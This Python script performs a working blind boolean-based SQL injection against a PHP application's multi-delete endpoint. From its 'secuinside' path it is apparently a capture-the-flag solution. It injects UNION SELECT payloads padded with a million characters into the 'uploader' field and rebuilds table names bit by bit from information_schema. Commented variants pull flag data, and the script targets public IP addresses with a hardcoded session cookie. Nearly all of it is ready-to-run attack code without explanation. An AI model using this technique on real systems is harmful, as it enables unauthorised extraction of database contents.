import requests

i = 1
find = ""
while True:
	_bin = ""
	for j in range(1, 8):
		#url = "http://10.211.55.3/secuinside/web2/index.php?page=delete&mode=multi" # local
		#url = "http://52.79.204.104/index.php?page=delete&mode=multi" # server 1
		url = "http://52.79.202.247/index.php?page=delete&mode=multi" # server 2
		header = {"Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=k110bp45hh27o8q1nhhj6bcr33"}

		#payload  union select 1,group_concat(table_name,0x3a,column_name) from information_schema.columns where table_schema=database()#"+"a"*1000000
		#uploader=adm1nkyj&idx%5B%5D=16&idx%5B%5D=17
		payload = {
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(flag),{},1))={},0x61646d316e6b796a,0),4,5 from read_me#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(table_name),{},1))={},0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(1=1,0x61646d316e6b796a,0),4,5 from read_me#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(table_name),"+str(i)+",1))="+str(j)+",0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"+"a"*1000000,
					#"substr(lpad(bin(ascii(substr(table_name,"+str(i)+",1))),"+str(j)+",0),1,1)"
					"uploader":"union select 1,2,if(substr(lpad(bin(ascii(substr(table_name,"+str(i)+",1))),7,0),"+str(j)+",1)=1,0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"+"a"*1000000,
					"idx":"\\",
				  }
		#print " union select 1,2,if(ascii(substr(group_concat(table_name),"+str(i)+",1))="+str(j)+",0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"
		content = requests.post(url, data=payload, headers=header).text
		#print content
		if content.find('Delete!') != -1:
			_bin += "1"
		else:
			_bin += "0"
	find += chr(int(_bin, 2))
	print find
	i += 1
